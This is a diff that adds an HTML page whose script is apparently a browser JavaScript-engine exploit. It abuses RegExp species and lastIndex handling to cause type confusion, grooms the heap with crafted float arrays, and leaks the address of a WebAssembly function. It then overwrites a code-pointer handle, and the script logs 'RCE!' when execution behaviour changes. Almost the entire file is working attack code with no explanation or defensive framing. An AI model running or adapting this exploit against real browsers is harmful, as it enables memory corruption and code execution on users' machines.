@@ -1,0 +1,113 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P74</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function flo(f){f64[0]=f;return u32[0];}
+function fhi(f){f64[0]=f;return u32[1];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe,PIN=0x1080011;
+const marker={mmm:1},marker2={zzz:2};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+objB[4]=wasmI;
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+objB[4]=wasmI;objB[5]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){const c1=w2f(PIN,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+try{
+const m=re.lastIndex;
+if(!Array.isArray(m)){log("NA");log("=== DONE ===");throw 0;}
+log("A=true");
+const cands=[];
+for(let k=0x8000;k<0x10010;k++){
+  try{const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+    if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){if(f2i(m[k+1])===v){const v3=f2i(m[k+2]);const w=v3&0xffffffffn;if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}}}}catch(e){break;}
+  if(cands.length>=6)break;
+}
+let OB=-1;
+for(const k of cands){const b=f2i(m[k+2]);objB[4]=marker2;const a=f2i(m[k+2]);objB[4]=marker;if(a!==b){OB=k;break;}}
+if(OB>=0){
+  log("OB:"+OB.toString(16));
+  objB[4]=wasmI.exports.f;const fA=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+  log("F:"+fA.toString(16));
+  const fR=fA&0xFFFFFFFE;
+  // Read ALL QWORDs from JSFunction (6 QWORDs) and follow cage pointers to find CPT handle
+  // CPT handle = value in range 0x400000-0x500000 (seen: 0x403C00, 0x403E00, 0x403400)
+  const allQ=[];
+  for(let i=0;i<6;i++){
+    const off=fR+i*8-0x1080018;const idx=Math.floor(off/8);
+    try{allQ.push([flo(m[idx]),fhi(m[idx])]);}catch(e){allQ.push([0,0]);}
+  }
+  // Search for handle in JSFunction itself
+  let handleIdx=-1,handleInLo=true;
+  for(let i=0;i<6;i++){
+    const[lo,hi]=allQ[i];
+    if(lo>=0x400000&&lo<0x500000){handleIdx=i;handleInLo=true;break;}
+    if(hi>=0x400000&&hi<0x500000){handleIdx=i;handleInLo=false;break;}
+  }
+  if(handleIdx>=0){
+    const h=handleInLo?allQ[handleIdx][0]:allQ[handleIdx][1];
+    log("H@FF"+handleIdx+":"+(handleInLo?"lo":"hi")+"="+h.toString(16));
+    log("PRE:"+wasmI.exports.f());
+    // Corrupt: set handle to 0
+    const off=fR+handleIdx*8-0x1080018;const idx=Math.floor(off/8);
+    if(handleInLo){m[idx]=w2f(0,fhi(m[idx]));}
+    else{m[idx]=w2f(flo(m[idx]),0);}
+    try{log("POST:"+wasmI.exports.f());if(wasmI.exports.f()!==42)log("BEHAVIOR_CHANGED");}
+    catch(e){log("CRASH:"+e.message);}
+  }else{
+    // Not in JSFunction directly — follow odd pointers to sub-objects
+    log("NO_H_IN_FF");
+    for(let i=0;i<6;i++){
+      const[lo,hi]=allQ[i];
+      for(const ptr of [lo,hi]){
+        if(ptr>0x1000000&&(ptr&1)){
+          const pr=ptr&0xFFFFFFFE;
+          // Read 4 QWORDs of this sub-object
+          for(let j=0;j<4;j++){
+            const off2=pr+j*8-0x1080018;const idx2=Math.floor(off2/8);
+            try{
+              const slo=flo(m[idx2]),shi=fhi(m[idx2]);
+              if(slo>=0x400000&&slo<0x500000){
+                log("H@sub"+ptr.toString(16)+"+"+j+":lo="+slo.toString(16));
+                log("PRE:"+wasmI.exports.f());
+                m[idx2]=w2f(0,shi);
+                try{log("POST:"+wasmI.exports.f());if(wasmI.exports.f()!==42)log("RCE!");}
+                catch(e){log("CRASH:"+e.message);}
+                throw 0;
+              }
+              if(shi>=0x400000&&shi<0x500000){
+                log("H@sub"+ptr.toString(16)+"+"+j+":hi="+shi.toString(16));
+                log("PRE:"+wasmI.exports.f());
+                m[idx2]=w2f(slo,0);
+                try{log("POST:"+wasmI.exports.f());if(wasmI.exports.f()!==42)log("RCE!");}
+                catch(e){log("CRASH:"+e.message);}
+                throw 0;
+              }
+            }catch(e){if(e===0)throw 0;}
+          }
+        }
+      }
+    }
+  }
+}else{log("STALE");}
+}catch(e){if(e!==0)log("E: "+e.message);}
+log("W: "+wasmI.exports.f());
+log("=== DONE ===");
+</script></body></html>
